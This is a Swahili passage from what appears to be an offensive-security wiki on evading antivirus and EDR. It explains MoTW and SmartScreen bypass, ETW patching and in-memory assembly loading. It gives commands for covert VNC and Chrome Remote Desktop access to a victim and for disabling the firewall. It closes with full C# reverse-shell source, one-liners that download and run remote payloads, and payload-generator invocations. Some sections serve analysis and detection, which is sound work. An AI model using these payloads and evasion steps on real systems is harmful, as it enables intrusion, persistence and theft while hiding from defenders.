> Mbinu kadhaa za obfuscation hutegemea kusimba data kwa njia fiche, jambo linaloongeza entropy ya binary na kurahisisha AVs na EDRs kuitambua. Kuwa mwangalifu na hili; huenda ikafaa kutumia usimbaji fiche kwa sehemu mahususi tu za code yako zilizo nyeti au zinazohitaji kufichwa.

### Kuondoa Obfuscation kwenye .NET Binaries Zilizolindwa na ConfuserEx

Unapochanganua malware inayotumia ConfuserEx 2 (au forks za kibiashara), mara nyingi hukumbana na tabaka kadhaa za ulinzi zinazozuia decompilers na sandboxes. Mchakato ulio hapa chini hurejesha kwa uhakika **IL iliyo karibu na ya awali**, ambayo baadaye inaweza ku-decompile kuwa C# kwa kutumia zana kama dnSpy au ILSpy.<sup>[[10]](#references)</sup>

1.  Kuondoa ulinzi dhidi ya kuchezewa – ConfuserEx husimba fiche kila *method body* na kuifungua ndani ya static constructor ya *module* (`<Module>.cctor`). Pia hubadilisha PE checksum, kwa hiyo marekebisho yoyote yatafanya binary iharibike. Tumia **AntiTamperKiller** kutafuta metadata tables zilizosimbwa fiche, kurejesha XOR keys na kuandika upya assembly safi:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Matokeo yana vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu unapounda unpacker yako mwenyewe.

2.  Urejeshaji wa alama / mtiririko wa udhibiti – peana faili *safi* kwa **de4dot-cex** (fork ya de4dot inayotambua ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bendera:
     • `-p crx` – chagua profaili ya ConfuserEx 2
     • de4dot itabatilisha control-flow flattening, kurejesha namespaces, classes na majina ya variables ya awali, na kusimbua strings za constant.

3.  Proxy-call stripping – ConfuserEx hubadilisha method calls za moja kwa moja na wrappers nyepesi (zinazojulikana pia kama *proxy calls*) ili kufanya decompilation iwe ngumu zaidi. Ziondoe kwa kutumia **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Baada ya hatua hii, unapaswa kuona .NET API za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizoeleweka (`Class8.smethod_10`, …).

4.  Usafishaji wa mikono – endesha binary inayotokana na hatua hii kwenye dnSpy, tafuta blob kubwa za Base64 au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata payload halisi. Mara nyingi, malware huihifadhi kama byte array iliyosimbwa kwa TLV na kuanzishwa ndani ya `<Module>.byte_0`.

Msururu huu hurejesha mtiririko wa utekelezaji **bila** kuhitaji kuendesha sample hasidi – jambo linalofaa unapofanya kazi kwenye workstation isiyo na muunganisho wa mtandao.

> 🛈  ConfuserEx huzalisha custom attribute inayoitwa `ConfusedByAttribute` inayoweza kutumika kama IOC kupanga samples kiotomatiki.

#### Mstari mmoja wa amri
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya open-source ya LLVM compilation suite inayoweza kuimarisha usalama wa software kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia tampering.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kutengeneza, wakati wa compilation, code iliyofichwa bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Huongeza safu ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework, jambo litakalofanya iwe vigumu zaidi kwa mtu anayetaka kuvunja application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza kuficha aina mbalimbali za pe files zikiwemo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni code engine rahisi ya metamorphic kwa executables za aina yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni framework ya code obfuscation yenye udhibiti wa kina kwa lugha zinazoungwa mkono na LLVM, inayotumia ROP (return-oriented programming). ROPfuscator huficha program katika kiwango cha assembly code kwa kubadilisha instructions za kawaida kuwa ROP chains, na hivyo kuvuruga dhana yetu ya kawaida kuhusu mtiririko wa udhibiti.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipakia

### LLVM compiler-assisted masking ya kila function yenyewe

Badala ya kuficha implant nzima wakati tu imelala, LLVM X86 backend iliyorekebishwa inaweza kuweka functions zilizochaguliwa zikiwa zimefichwa kwa XOR kila zinapokuwa hazitumiki. Function Peekaboo PoC huchagua majina yaliyofanyiwa demangling yenye `REG_`, huingiza entry/exit stubs zinazojitegemea na nafasi kuzunguka machine code ya mwisho, na kutoa masking handler moja ya pamoja ndani ya `.text`; signatures za kiwango cha source na Windows x64 calling convention hubaki bila kubadilika.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mabadiliko ya control flow kwenye backend

Hili linapaswa kufanyika baada ya instruction selection na optimization kwa sababu mabadiliko haya lazima yajumuishe **kila return inayotolewa** na yajue mpangilio halisi wa x86. `MachineFunctionPass` inayotekelezwa kabla ya kutoa code hutafuta `MachineInstr::isReturn()` ya mwisho, huifuta ili njia ya mwisho ipite moja kwa moja kwenye epilogue iliyoongezwa, na kubadilisha returns za awali kuwa `JMP_1 handler`. Hifadhi teardown yoyote ya stack/frame iliyotengenezwa na compiler kabla ya kila return; elekeza upya instruction ya return pekee.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` na `emitFunctionBodyEnd()` hutoa stubs za kila function, huku `emitEndOfAsmFile()` ikitoa handler. Symbols zinazoshirikiwa kati ya hatua za utoaji huruhusu prologue branch kuelekeza kwenye epilogue yake inayofuata; kwa `je` ya karibu inayotolewa kwa mkono, andika `0F 84` ikifuatiwa na MC expression ya byte nne `target - address_after_je`. Calls na jumps kwenda kwa handler zinaweza badala yake kutolewa kama objects za `MCInst` (`CALL64pcrel32` na `JMP_1`). Pass lazima irudishe `false` kwa function isiyochaguliwa ikiwa haikubadilisha chochote; PoC hurudisha `true` kimakosa katika hali hiyo.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata na initialization kabla ya CRT

PoC huweka XOR key na records za byte 16 zenye function pointer iliyorekebishwa na loader pamoja na urefu wa runtime ndani ya `.funcmeta`. Ingawa field ya C ni `uint32_t`, handler husoma QWORD kwenye offset ya record `+8`, ikitumia urefu na padding yake, na husogeza records kwa `0x10`. Majina ya PE section yana urefu wa byte nane tu, kwa hiyo runtime lookup huona `.funcmet`. Patcher ya nje huongeza `.stub` inayoweza kutekelezwa, huhifadhi RVA ya entry point ya awali ndani ya stub, na kuelekeza upya `AddressOfEntryPoint`; PIC stub hupata image base kutoka `gs:[0x60]` → `[PEB+0x10]`, hupitia imports za PE32+ ili kupata `VirtualProtect` ambayo tayari imeingizwa, na huendesha kabla ya CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization huweka sentinel ndani ya `gs:[0xE8]` na kuita kila function ya metadata. Prologue yake inayosomeka daima huhifadhi mwanzo wa function ndani ya `gs:[0xF0]`, hukagua sentinel, na kuruka body ambayo bado haijafichwa. Kisha epilogue hutumia `call handler`; baada ya handler kuhifadhi registers 13 (`0x68` bytes), return address kwenye `[rsp+0x68]` huwa mwisho wa function iliyobadilishwa, kwa hiyo `end - start` inaweza kuandikwa kwenye record yake ya metadata. Stub hufuta sentinel na kuruka kwenye `ImageBase + original_entry_point_RVA` baada ya bodies zote kufichwa.<sup>[[38]](#references)[[39]](#references)</sup>

Wakati wa call ya kawaida, prologue huita handler hiyo hiyo ili kufungua body. Njia ya mwisho hupita moja kwa moja kwenye epilogue iliyoongezwa, ilhali kila return ya awali huruka moja kwa moja kwa handler ya pamoja. Epilogue ya kawaida pia hutumia `jmp handler` badala ya `call`, ili baada ya kuficha tena, `ret` ya handler itumie return address ya awali ya caller na kuhifadhi matokeo ya function ndani ya `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Mbinu ya kuficha na viashiria vya uchanganuzi

Handler hupata record ya sasa, huruka prologue inayoonekana yenye urefu usiobadilika (`0x46` bytes katika build hii), hubadilisha sehemu iliyobaki kuwa `PAGE_EXECUTE_READWRITE`, huifanya XOR byte kwa byte kwa kutumia byte ya chini ya key, kisha huiweka kuwa `PAGE_EXECUTE_READ`. Kwa hiyo, loop hiyo hiyo hufungua code wakati wa kuingia na kuificha tena kila inapotoka kawaida.<sup>[[38]](#references)[[39]](#references)</sup>

Viashiria muhimu vya muundo huu ni pamoja na:<sup>[[38]](#references)[[39]](#references)</sup>

- entry point iliyo ndani ya `.stub` inayoweza kutekelezwa na section ya `.funcmet` yenye key pamoja na pointers za `.text` zilizorekebishwa;
- uchanganuzi wa PEB, import-table, na section-table kabla ya CRT, ukifuatiwa na calls kupitia kila pointer ya metadata;
- PIC prologues zinazofanana za `call`/`pop` na return sites nyingi zinazoelekezwa kwa handler moja;
- writes kwenye `gs:[0xE8]`, `gs:[0xF0]`, na `gs:[0xF8]` zikifuatiwa na mabadiliko yanayojirudia ya `VirtualProtect` na writes za XOR byte kwa byte ndani ya executable pages zinazohifadhiwa na image.

Huu ni ukwepaji wa memory scanner, si ulinzi wa kriptografia: file iliyorekebishwa bado ina body ya awali iliyo wazi, na debugger inaweza kuweka breakpoint kwenye `VirtualProtect` au XOR loop na kutoa dump ya function inayotumika. XOR ya byte moja, metadata inayosomeka, na mpaka usiobadilika wa `0x46` pia hurahisisha urejeshaji wa offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> TEB slots za PoC ni za kila thread, lakini code pages zilizorekebishwa ni za process nzima. Kwa hiyo, kuingia kwa wakati mmoja au kwa kujirudia kunaweza kubadilisha tena instructions wakati invocation nyingine bado inatekelezwa; exceptions na exits zisizo za kawaida pia zinaweza kuruka hatua ya kuficha tena. Utekelezaji imara lazima usawazishe mabadiliko haya, urejeshe protection halisi iliyorudishwa kupitia `lpflOldProtect`, uepuke urefu wa stub uliowekwa hard-code, ukague njia zote za `call` na `jmp` ili kuhakikisha stack alignment ya x64, na uite `FlushInstructionCache` baada ya kuandika upya executable bytes. Microsoft inabainisha wazi kuwa caller anawajibika kuhakikisha instruction-cache coherency code inayoweza kutekelezwa inapobadilishwa.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Huenda umewahi kuona skrini hii unapopakua baadhi ya executables kutoka kwenye intaneti na kuziendesha.

Microsoft Defender SmartScreen ni utaratibu wa usalama uliokusudiwa kumlinda mtumiaji dhidi ya kuendesha applications zinazoweza kuwa hasidi.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen hufanya kazi hasa kwa kutumia mbinu inayotegemea reputation; hii inamaanisha kuwa applications ambazo hazipakuliwi sana zitawasha SmartScreen, hivyo kumwonya na kumzuia mtumiaji kuendesha file (ingawa file bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier, ambayo huundwa kiotomatiki wakati wa kupakua files kutoka kwenye intaneti, pamoja na URL ilikotoka.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS ya file iliyopakuliwa kutoka kwenye intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kukumbuka kuwa executables zilizosainiwa kwa signing certificate **inayoaminika** **hazitawasha SmartScreen**.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii ni kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwenye volumes zisizo **NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni tool inayopakia payloads ndani ya output containers ili kukwepa Mark-of-the-Web.

Mfano wa matumizi:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Huu hapa ni mfano wa kukwepa SmartScreen kwa kufungasha payloads ndani ya faili za ISO kwa kutumia [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ni utaratibu madhubuti wa kurekodi kumbukumbu katika Windows unaoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, bidhaa za usalama pia zinaweza kuutumia kufuatilia na kugundua shughuli hasidi.

Sawa na jinsi AMSI inavyozimwa (kukwepwa), inawezekana pia kufanya kazi ya **`EtwEventWrite`** ya mchakato wa user space irudi mara moja bila kurekodi matukio yoyote. Hili hufanywa kwa kurekebisha kazi hiyo kwenye memory ili irudi mara moja, na hivyo kuzima logging ya ETW kwa mchakato huo.

Unaweza kupata maelezo zaidi kwenye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Kupakia binaries za C# kwenye memory kumejulikana kwa muda mrefu, na bado ni njia nzuri sana ya kuendesha zana zako za post-exploitation bila kugunduliwa na AV.

Kwa kuwa payload itapakiwa moja kwa moja kwenye memory bila kugusa disk, tutahitaji tu kuwa na wasiwasi wa kurekebisha AMSI kwa mchakato mzima.

Frameworks nyingi za C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, n.k.) tayari zina uwezo wa kutekeleza C# assemblies moja kwa moja kwenye memory, lakini kuna njia tofauti za kufanya hivyo:

- **Fork\&Run**

Hii inahusisha **kuanzisha mchakato mpya wa kutumika kama kafara**, kuingiza msimbo hasidi wa post-exploitation ndani ya mchakato huo mpya, kutekeleza msimbo hasidi na kuumaliza mchakato mpya ukikamilika. Mbinu hii ina faida na hasara zake. Faida ya mbinu ya fork and run ni kwamba utekelezaji hufanyika **nje ya** mchakato wa Beacon implant. Hii inamaanisha kwamba jambo likienda vibaya au kugunduliwa wakati wa hatua ya post-exploitation, kuna **uwezekano mkubwa zaidi** wa **implant yetu kunusurika.** Hasara yake ni kwamba kuna **uwezekano mkubwa zaidi** wa kugunduliwa na **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Hii inahusu kuingiza msimbo hasidi wa post-exploitation **ndani ya mchakato wake wenyewe**. Kwa njia hii, unaweza kuepuka kuunda mchakato mpya na kuufanyia AV scan, lakini hasara yake ni kwamba utekelezaji wa payload yako ukienda vibaya, kuna **uwezekano mkubwa zaidi** wa **kupoteza beacon yako** kwa sababu mchakato unaweza ku-crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ikiwa ungependa kusoma zaidi kuhusu upakiaji wa C# Assembly, tafadhali angalia makala hii [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) na InlineExecute-Assembly BOF yao ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Unaweza pia kupakia C# Assemblies **kutoka PowerShell**; angalia [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) na [video ya S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Kutumia Lugha Nyingine za Programu

Kama ilivyopendekezwa kwenye [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), inawezekana kutekeleza msimbo hasidi kwa kutumia lugha nyingine kwa kuipa mashine iliyoathiriwa ufikiaji **wa mazingira ya interpreter yaliyosakinishwa kwenye SMB share inayodhibitiwa na Attacker**.

Kwa kuruhusu ufikiaji wa Interpreter Binaries na mazingira yaliyo kwenye SMB share, unaweza **kutekeleza msimbo wowote wa lugha hizi ndani ya memory** ya mashine iliyoathiriwa.

Repo inaeleza: Defender bado hufanya scan ya scripts, lakini kwa kutumia Go, Java, PHP n.k. tunapata **uwezo zaidi wa kukwepa static signatures**. Majaribio ya scripts za reverse shell zisizo na obfuscation katika lugha hizi yamefanikiwa.

## TokenStomping

Token stomping hubadilisha access token ya bidhaa ya usalama kama vile EDR au AV. Kupunguza ruhusa za token kunaweza kuacha mchakato ukiendelea huku kukizuia kufanya ukaguzi au hatua za kurekebisha zinazohitaji ruhusa za juu.

Ili kuzuia hili, Windows inaweza **kuzuia michakato ya nje** kupata handles za token za michakato ya usalama.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Kutumia Programu Zinazoaminika

### Chrome Remote Desktop

Kama ilivyoelezwa kwenye [**chapisho hili la blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), ni rahisi kusakinisha Chrome Remote Desktop kwenye PC ya mwathiriwa kisha kuitumia kuichukua na kudumisha persistence:<sup>[[35]](#references)</sup>
1. Pakua kutoka https://remotedesktop.google.com/, bofya "Set up via SSH", kisha ubofye faili ya MSI ya Windows ili kuipakua.
2. Endesha kisakinishi kimyakimya kwenye mashine ya mwathiriwa (unahitaji ruhusa za admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Rudi kwenye ukurasa wa Chrome Remote Desktop na ubofye next. Wizard itakuomba uidhinishe; bofya kitufe cha Authorize ili kuendelea.
4. Tekeleza amri uliyopewa baada ya kufanya marekebisho yanayohitajika: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parameter ya `--pin` huweka PIN bila kutumia GUI).
 

## Kukwepa Ugunduzi kwa Mbinu za Juu

Kukwepa ugunduzi ni mada ngumu sana; wakati mwingine unapaswa kuzingatia vyanzo vingi tofauti vya telemetry kwenye mfumo mmoja, kwa hiyo ni vigumu kabisa kutogunduliwa katika mazingira yaliyokomaa.

Kila mazingira unayolenga yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili kupata utangulizi wa mbinu za juu zaidi za kukwepa ugunduzi.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Haya pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia sehemu ambazo Defender inatambua kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **itaondoa sehemu za binary** hadi **itagundua ni sehemu gani Defender** inayoichukulia kuwa hasidi, kisha itakuonyesha sehemu hiyo.\
Zana nyingine inayofanya **jambo lilelile ni** [**avred**](https://github.com/dobin/avred), ambayo hutoa huduma hiyo kupitia tovuti ya wazi kwenye [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kusakinisha (kama administrator) kwa kutekeleza:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Ifanye **ianze** mfumo unapowashwa na uiendeshe sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet** (stealth) **na uzime firewall**:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji vipakuliwa vya bin, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Washa chaguo _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ lililoundwa **hivi karibuni** ndani ya **mhasiriwa**

#### **Muunganisho wa kurudi nyuma**

**Mshambuliaji** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili awe **tayari** kupokea **muunganisho wa VNC** wa kurudi nyuma. Kisha, ndani ya **mhasiriwa**: Anzisha daemon ya winvnc `winvnc.exe -run` na endesha `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha kutogundulika, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, la sivyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inaendeshwa kwa `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika saraka hiyo hiyo, la sivyo itasababisha [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) kufunguka
- Usiendeshe `winvnc -h` kwa ajili ya msaada, la sivyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anza lister** kwa kutumia `msfconsole -r file.rc` na **utekeleze** **xml payload** kwa kutumia:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender ya sasa itasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikompile kwa:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya obfuscators za C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Mfano wa kutumia Python kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### More

